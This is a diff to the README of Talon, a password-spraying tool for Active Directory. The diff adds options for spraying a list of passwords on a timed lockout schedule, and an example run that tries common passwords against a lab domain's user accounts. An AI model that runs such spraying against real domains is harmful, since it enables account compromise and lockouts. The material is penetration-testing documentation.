@@ -38,6 +38,8 @@ go build Talon.go
 ```
 $ ./Talon -h
 Usage of ./Talon:
+  -A float
+    	Authentication attempts per lockout period (default 3)
   -D string
     	Fully qualified domain to use
   -E	Enumerates which users are valid
@@ -47,10 +49,14 @@ Usage of ./Talon:
     	File containing the list of domain controllers to connect to
   -K	Test against Kerberos only
   -L	Test against LDAP only
+  -Lockout float
+    	Account lockout period in minutes (default 60)
   -O string
     	File to append the results to
   -P string
     	Password to use
+  -Passfile string
+    	File containing the list of passwords
   -U string
     	Username to authenticate as
   -Userfile string
@@ -134,6 +140,11 @@ root@kali:~# ./Talon -Hostfile DCs -Userfile ValidUsers -D STARLABS.local -P "Pa
 [*] Account lock out detected - Do you want to continue.[y/n]:
 ```
 
+
+###
+
+
+
 ### Troubleshooting
 Talon comes equip to detect if the  targeted domain controllers are activy or become unavialble. This helps ensure your getting accurate results while not wasting time. 
 
@@ -156,6 +167,44 @@ root@kali:~# ./Talon -H 172.14.15.1 -Userfile ValidUsers -D STARLABS.local -P "F
 ```
 
 
+### Timing Controls
+
+Talon has the ability to perform password guessing against a list of possible passwords in a file using the (`-Passfile`). As this can be VERY DANGEROUS, Talon has controls in place to pause after a certain amount of attempts (`-A`) for a specified time (`-Lockout`). <b>Please note</b> that it is important to know the password policy before using these options as queueing multiple password attempts can lock out accounts if you do not have the Password policy. 
+
+
+```
+./Talon -H 172.16.144.185 -Userfile users -Passfile Passwords -D STARLABS.local -Lockout 45 -A 2 -sleep 1.5
+
+  __________  ________  ___       ________  ________
+  |\___    _\\\   __  \|\  \     |\   __  \|\   ___  \
+  \|___ \  \_\ \  \|\  \ \  \    \ \  \|\  \ \  \\ \  \
+       \ \  \ \ \   __  \ \  \    \ \  \\\  \ \  \\ \  \
+        \ \  \ \ \  \ \  \ \  \____\ \  \\\  \ \  \\ \  \
+         \ \__\ \ \__\ \__\ \_______\ \_______\ \__\\ \__\
+          \|__|  \|__|\|__|\|_______|\|_______|\|__| \|__|
+					          (@Tyl0us)
+
+
+[*] Warning: Selection option will spray multiple passwords and risk locking accounts. Do you want to continue? [y/n]: y
+
+03-10-2022 15:58:21: Using password: Password123
+[-]  172.16.144.185 STARLABS.LOCAL\admin:Password123 = Failed
+[-]  172.16.144.185 STARLABS.LOCAL\ballen:Password123 = Failed
+[-]  172.16.144.185 STARLABS.LOCAL\cramon:Password123 = Failed
+[-]  172.16.144.185 STARLABS.LOCAL\hwells:Password123 = Failed
+[-]  172.16.144.185 STARLABS.LOCAL\ssmith:Password123 = Failed
+03-10-2022 15:58:26: Using password: Spring2022
+[-]  172.16.144.185 STARLABS.LOCAL\admin:Spring2022 = Failed
+[-]  172.16.144.185 STARLABS.LOCAL\ballen:Spring2022 = Failed
+[-]  172.16.144.185 STARLABS.LOCAL\cramon:Spring2022 = Failed
+[-]  172.16.144.185 STARLABS.LOCAL\hwells:Spring2022 = Failed
+[-]  172.16.144.185 STARLABS.LOCAL\ssmith:Spring2022 = Failed
+
+Hit timeout period - Sleeping for 45 minutes...
+Will resume at 03-10-2022 16:43:35
+```
+
+
 
 ##### Changelog
 * Published  on 04/09/2018
@@ -163,3 +212,4 @@ root@kali:~# ./Talon -H 172.14.15.1 -Userfile ValidUsers -D STARLABS.local -P "F
 * Version 1.3 released 05/03/2019
 * Version 1.4 released 03/17/2020
 * Version 2.0 public relase 06/18/2020
+* Version 3.0 relase 03/10/2022
